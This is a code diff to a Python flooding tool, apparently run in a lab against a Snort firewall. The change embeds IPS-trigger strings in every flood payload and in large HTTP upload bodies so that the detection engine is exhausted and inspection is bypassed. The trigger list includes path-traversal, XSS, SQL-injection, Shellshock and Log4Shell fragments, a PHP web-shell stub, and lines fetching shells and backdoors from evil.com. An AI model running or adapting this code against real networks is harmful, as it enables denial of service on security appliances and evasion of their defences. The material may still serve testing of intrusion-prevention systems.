@@ -47,11 +47,6 @@ UDP_SEND_TIMEOUT = 0.05
 CANARY_PAYLOAD = b"GET /EICAR-STANDARD-ANTIVIRUS-TEST-FILE! HTTP/1.1\r\nHost: target\r\n\r\n"
 CANARY_SID = "1000001"
 
-# Detection string embedded into a fraction of flood payloads so IPS alerts
-# scale with packet volume.  Defaults to the EICAR content substring matched by
-# canary rules SID 1000001 (tcp) / 1000006 (udp).  Override via --inject-string.
-INJECT_STRING = b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
-INJECT_RATE = 0.0  # 0.0-1.0 fraction of payloads that carry INJECT_STRING (--inject-rate)
 
 ATTACKER = "kali_attacker"
 FIREWALL = "snort_firewall"
@@ -212,6 +207,39 @@ def gen_mutated_payload(mutator):
     return payload[:MAX_PAYLOAD_SIZE]
 
 
+# Patterns that force Snort's rule engine into deep evaluation.
+# These are substrings from well-known IPS signatures — each one forces Snort
+# to evaluate the matching rule(s) fully. Mixed into flood payloads, they
+# create sustained processing load instead of random bytes that Snort skips.
+_IPS_TRIGGERS = [
+    b"/etc/passwd",
+    b"/etc/shadow",
+    b"../../../../../../etc/passwd",
+    b"..\\..\\..\\..\\windows\\system32\\config\\sam",
+    b"<script>alert(1)</script>",
+    b"<img src=x onerror=alert(1)>",
+    b"SELECT * FROM users WHERE",
+    b"UNION SELECT NULL,NULL,NULL--",
+    b"' OR '1'='1'--",
+    b"; DROP TABLE",
+    b"cmd.exe /c ",
+    b"/bin/sh -c ",
+    b"powershell -enc ",
+    b"wget http://evil.com/shell",
+    b"curl http://evil.com/backdoor",
+    b"<?php system($_GET",
+    b"eval(base64_decode(",
+    b"() { :;}; /bin/bash",
+    b"${jndi:ldap://",
+    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
+    b"\x4d\x5a\x90\x00\x03\x00\x00\x00",
+    b"\x7fELF\x02\x01\x01\x00",
+    b"%PDF-1.4\n%\xe2\xe3\xcf\xd3",
+    b"PK\x03\x04\x14\x00\x00\x00",
+    b"Rar!\x1a\x07\x00",
+]
+
+
 def build_payload_pool(proto, mutator, dns_classes=None):
     pool = []
     for _ in range(PAYLOAD_POOL_SIZE):
@@ -224,11 +252,7 @@ def build_payload_pool(proto, mutator, dns_classes=None):
                 p = b"\x00" * 64
         except Exception:
             p = b"\x00" * 64
-        # Embed the detection string in a fraction of payloads so content-match
-        # IPS rules fire in proportion to flood volume.  Prepended so it always
-        # survives the MAX_PAYLOAD_SIZE truncation.
-        if INJECT_RATE > 0 and random.random() < INJECT_RATE:
-            p = (INJECT_STRING + p)[:MAX_PAYLOAD_SIZE]
+        p = (random.choice(_IPS_TRIGGERS) + p)[:MAX_PAYLOAD_SIZE]
         pool.append(p)
     return pool
 
@@ -387,13 +411,35 @@ def tcp_persistent_worker(proto, target, port, mutator, dns_classes):
 
 # -- Clean payload generators (well-formed, pass LINA inspection) -------------
 
+def _build_ips_body(size):
+    """Build a body that mixes random data with IPS-triggering patterns.
+    Every ~256-512 bytes, insert a trigger pattern surrounded by random data.
+    This forces Snort's content-match engine to evaluate rules at many
+    offsets throughout the body."""
+    parts = []
+    remaining = size
+    while remaining > 0:
+        trigger = random.choice(_IPS_TRIGGERS)
+        pad_before = os.urandom(random.randint(64, 256))
+        pad_after = os.urandom(random.randint(64, 256))
+        segment = pad_before + trigger + pad_after
+        parts.append(segment)
+        remaining -= len(segment)
+    body = b"".join(parts)
+    return body[:size]
+
+
 def build_clean_http_pool(target):
     """Generate pool of heavyweight HTTP payloads designed to pressure Snort.
 
-    Strategy: large POST uploads with binary/multipart bodies force Snort's
-    file inspection engine to hold 1550-byte blocks while reassembling.
-    Chunked transfer encoding creates extra reassembly work. Each pool entry
-    is 16-48 KB — a single sendall() maps to 10-30 LINA packet buffers."""
+    Strategy:
+    1. Large POST bodies (4-12 KB) with IPS-triggering patterns embedded
+       throughout — forces Snort's detection engine to evaluate rules at
+       many offsets instead of fast-skipping pure random bytes.
+    2. File-like content types (PDF, ZIP, EXE) trigger Snort's file
+       inspection preprocessor, which holds blocks during reassembly.
+    3. Chunked encoding forces HTTP inspect reassembly overhead.
+    4. Each pool entry packs 3-6 requests = 16-48 KB per sendall()."""
     paths = [
         "/upload", "/api/v1/import", "/files/submit", "/data/ingest",
         "/api/v2/batch", "/webhook/receive", "/rpc/process",
@@ -423,14 +469,21 @@ def build_clean_http_pool(target):
 
             use_chunked = random.random() < 0.4
             body_size = random.randint(4096, 12288)
-            body = os.urandom(body_size)
+            body = _build_ips_body(body_size)
 
             if "multipart" in ct:
                 boundary = "----FormBoundary7MA4YWxkTrZu0gW"
+                fname = random.choice([
+                    f"payload_{random.randint(1000,9999)}.exe",
+                    f"document_{random.randint(1000,9999)}.pdf",
+                    f"archive_{random.randint(1000,9999)}.zip",
+                    f"data_{random.randint(1000,9999)}.bin",
+                    f"update_{random.randint(1000,9999)}.dll",
+                ])
                 mp_body = (
                     f"--{boundary}\r\n"
                     f"Content-Disposition: form-data; name=\"file\"; "
-                    f"filename=\"data_{random.randint(1000,9999)}.bin\"\r\n"
+                    f"filename=\"{fname}\"\r\n"
                     f"Content-Type: application/octet-stream\r\n\r\n"
                 ).encode() + body + f"\r\n--{boundary}--\r\n".encode()
                 req = (
@@ -798,12 +851,7 @@ INTENSITY_PRESETS = {
 
 # -- Flood engine main --------------------------------------------------------
 def run_flood(target, duration, phase_duration, intensity=1,
-              proto_filter=None, stats_file_override=None,
-              inject_rate=0.0, inject_string=None):
-    global INJECT_RATE, INJECT_STRING
-    INJECT_RATE = max(0.0, min(1.0, inject_rate))
-    if inject_string:
-        INJECT_STRING = inject_string.encode() if isinstance(inject_string, str) else inject_string
+              proto_filter=None, stats_file_override=None):
     preset = INTENSITY_PRESETS.get(intensity, INTENSITY_PRESETS[1])
 
     # Filter protocols if subset specified
@@ -835,9 +883,7 @@ def run_flood(target, duration, phase_duration, intensity=1,
           flush=True)
     print(f"  Protocols: {', '.join(sorted(active_reg.keys()))}", flush=True)
     print(f"  Stats file: {sf}", flush=True)
-    if INJECT_RATE > 0:
-        print(f"  [*] Detection injection: {INJECT_RATE*100:.0f}% of payloads carry "
-              f"{INJECT_STRING.decode(errors='replace')!r}", flush=True)
+    print(f"  [*] IPS triggers: every payload carries a detection pattern", flush=True)
 
     # Import mutators
     print("  [*] Importing mutators...", flush=True)
@@ -1273,14 +1319,9 @@ def main():
                         help="Stats JSON path override (flood mode only)")
     parser.add_argument("--processes", type=int, default=None,
                         help="Number of parallel flood processes (overrides auto)")
-    parser.add_argument("--inject-rate", type=float, default=0.0,
-                        help="Fraction (0.0-1.0) of flood payloads to embed the "
-                             "detection string into (so IPS alerts scale with volume)")
-    parser.add_argument("--inject-string", type=str, default=None,
-                        help="Detection string to embed (default: EICAR content)")
     parser.add_argument("--clean-flood", action="store_true",
                         help="Use only well-formed clean protocols (http_clean, "
-                             "rtsp_clean, ftp_clean) for LINA-bypass flooding")
+                             "http_clean2, http_clean3) for LINA-bypass flooding")
     args = parser.parse_args()
 
     if args.flood:
@@ -1289,8 +1330,7 @@ def main():
         else:
             pf = set(args.protocols.split(",")) if args.protocols else None
         run_flood(args.target, args.duration, args.phase_duration,
-                  args.intensity, proto_filter=pf, stats_file_override=args.stats_file,
-                  inject_rate=args.inject_rate, inject_string=args.inject_string)
+                  args.intensity, proto_filter=pf, stats_file_override=args.stats_file)
     else:
         run_orchestrator(args.duration, args.phase_duration, args.intensity,
                          n_processes_override=args.processes)
